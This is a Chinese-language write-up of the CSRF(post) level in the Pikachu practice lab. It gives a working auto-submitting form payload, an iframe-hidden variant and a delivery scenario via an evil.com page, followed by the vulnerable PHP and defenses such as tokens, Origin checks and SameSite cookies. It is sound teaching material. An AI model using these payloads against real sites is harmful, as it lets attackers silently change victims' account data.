# CSRF(post) 通关笔记
> 和上一关的漏洞一模一样，唯一的区别是：**提交方式从 GET 变成了 POST。**
>
> 很多人以为"POST 就安全了"——因为参数不在 URL 里，没法直接发链接。
>
> 但攻击者可以做一个**自动提交表单的页面**，效果完全相同。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | CSRF → CSRF(post) |
| 登录页 | `http://pikachu/vul/csrf/csrfpost/csrf_post_login.php` |
| 会员中心 | `http://pikachu/vul/csrf/csrfpost/csrf_post.php` |
| 修改页 | `http://pikachu/vul/csrf/csrfpost/csrf_post_edit.php` |
| 测试账号 | `vince` / `123456` |
| 目标 | 在受害者不知情的情况下改掉他的个人信息 |
---
## 二、我的解题步骤
### 步骤 1：登录，看流程
和上一关一样，先登录 `vince` / `123456`，进入会员中心。
### 步骤 2：点「修改个人信息」，抓请求
这次点 submit 之后，地址栏是干净的：
```
csrf_post_edit.php
```
参数不在 URL 里了——它们在**请求体**里：
```
POST /vul/csrf/csrfpost/csrf_post_edit.php HTTP/1.1
Host: pikachu
Content-Type: application/x-www-form-urlencoded
sex=boy&phonenum=18626545453&add=chain&email=vince@pikachu.com&submit=submit
```
### 步骤 3：意识到不能"发链接"了
上一关可以直接把 URL 发给人，这一关不行——你发 `csrf_post_edit.php` 这个地址，打开只是一个空表单。
**必须让受害者的浏览器"发出这个 POST"。**
### 步骤 4：写一个自动提交的页面
在自己电脑上建一个 `csrf.html`：
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="post">
    <input type="hidden" name="sex" value="hacked2">
    <input type="hidden" name="phonenum" value="220220">
    <input type="hidden" name="add" value="HACKED2">
    <input type="hidden" name="email" value="h2@evil.com">
    <input type="hidden" name="submit" value="submit">
  </form>
</body>
</html>
```
**关键在 `body onload="document.forms[0].submit()"`** —— 页面一打开，表单自动提交。
### 步骤 5：模拟受害者
在**保持登录**的浏览器里打开这个 `csrf.html`。
页面一闪，跳到了会员中心。
### 步骤 6：确认改成功了
我实际跑了一遍，数据变化：
| 字段 | 修改前 | 修改后 |
| --- | --- | --- |
| 性别 | boy | **hacked2** |
| 手机 | 18626545453 | **220220** |
| 住址 | chain | **HACKED2** |
| 邮箱 | vince@pikachu.com | **h@evil.com** |
**和上一关的结果完全一样。**
---
## 三、原理分析
### 3.1 修改页的源码
```php
$html1='';
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
        $getdata=escape($link, $_POST);
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:csrf_post.php");
        }
    }
}
```
和上一关唯一的区别：
| | CSRF(get) | CSRF(post) |
| --- | --- | --- |
| 取值 | `$_GET` | `$_POST` |
| 有没有 token | 没有 | 没有 |
| 有没有 Referer 校验 | 没有 | 没有 |
**防护上一个都没加，只是换了个提交方式。**
### 3.2 为什么"自动提交表单"能跨域工作
这里有个关键点，很多人想不通：
> **表单可以跨域提交，不受同源策略限制。**
同源策略限制的是：
- 读取别的域的响应内容 ❌
- 但**发送请求**（表单提交、图片加载、脚本加载）✅ 可以
所以：
```
victim.com 的页面里有一个 <form action="bank.com/transfer" method="post">
        ↓
用户点击提交（或 JS 自动提交）
        ↓
浏览器带着 bank.com 的 Cookie 发出 POST
        ↓
bank.com 收到请求，执行
```
**浏览器不会阻止这个请求，因为它只是"发送"，不涉及"读取对方响应"。**
### 3.3 攻击者实际怎么投递
真实场景中，攻击者会：
1. 把 `csrf.html` 上传到自己的服务器
2. 把链接发给受害者：`http://evil.com/csrf.html`
3. 受害者点开 → 页面加载 → 表单自动提交
4. 受害者看到的是一个空白的、或者伪装的页面
**整个过程受害者只看到"页面闪了一下"。**
---
## 四、知识点与笔记
### 4.1 POST 不等于安全
这是本关最重要的一条。
| 常见误解 | 现实 |
| --- | --- |
| "参数不在 URL 里，没法发链接" | 可以做个自动提交表单的页面 |
| "POST 比 GET 安全" | **只是投递方式不同，防护能力一样** |
| "浏览器会拦截跨域 POST" | 不会，表单提交是允许的 |
**GET 和 POST 是 HTTP 的语义区别，不是安全边界。**
### 4.2 同源策略到底限制什么
| 行为 | 允许跨域吗 |
| --- | --- |
| 发起表单 POST | ✅ 允许 |
| 加载图片 `<img src>` | ✅ 允许 |
| 加载脚本 `<script src>` | ✅ 允许 |
| 用 `fetch` 发请求（无 CORS） | ❌ 响应读不到，但请求仍会发出 |
| 读取对方页面的 DOM | ❌ 不允许 |
| 读取对方页面的 Cookie | ❌ 不允许 |
**核心：能"发"，不能"读"。**
CSRF 只需要"发"，所以同源策略挡不住它。
### 4.3 投递方式的对比
| | CSRF(get) | CSRF(post) |
| --- | --- | --- |
| 投递物 | 一条链接 | 一个页面 |
| 受害者操作 | 点一下 | 打开页面 |
| 成功率 | 高 | 略低（要跳到别的域名） |
| 隐蔽性 | 低（URL 里有奇怪参数） | 高（地址栏干净） |
**POST 型的隐蔽性更好**——受害者看不到 URL 里的异常参数。
### 4.4 变种：用 iframe 隐藏
更隐蔽的做法是把表单放进 iframe：
```html
<iframe name="hidden" style="display:none"></iframe>
<form action="http://target.com/edit" method="post" target="hidden">
  ...
</form>
<script>document.forms[0].submit()</script>
```
受害者连"页面闪一下"都看不到。
---
## 五、和前面几关的区别
| | CSRF(get) | CSRF(post) |
| --- | --- | --- |
| 参数位置 | URL | 请求体 |
| 能不能直接发链接 | 能 | **不能** |
| 投递方式 | 链接 | **自动提交表单** |
| 服务端代码 | 无防护 | 无防护 |
| 结果 | 信息被改 | 信息被改 |
**漏洞本质完全一样，只是投递方式不同。**
---
## 六、防御怎么写
### 6.1 加 token（唯一真正有效的手段）
```php
// 生成
$_SESSION['token'] = bin2hex(random_bytes(32));
// 表单
<input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
// 校验
if (!hash_equals($_SESSION['token'], $_POST['token'] ?? '')) {
    exit('非法请求');
}
```
**为什么 token 对 POST 有效？**
因为攻击者的页面**读不到**目标站页面里的 token（同源策略禁止跨域读 DOM）。
### 6.2 检查 Origin / Referer
```php
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if ($origin && $origin !== 'https://your-site.com') {
    exit('非法来源');
}
```
**注意**：`Referer` 可能被浏览器隐私设置去掉，所以要用 `Origin` 做主判断，`Referer` 做辅助。
### 6.3 Cookie 加 SameSite
```php
session_set_cookie_params(['samesite' => 'Lax']);
```
`Lax` / `Strict` 之后，跨站请求不带 Cookie——**本关直接被干掉。**
### 6.4 关键操作二次确认
改密码、改邮箱这类操作，要求输入旧密码或验证码。
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | POST 不能防 CSRF |
| 关键点 | 表单可以跨域提交 |
| 攻击方式 | 自动提交表单的页面 |
| 隐蔽性 | 比 GET 更高（地址栏干净） |
| 修复 | token + SameSite |
**一句话**：
> **POST 只是让攻击者多写一个页面，不是让攻击变得更难。**
---
## 参考


- [OWASP: CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: 同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
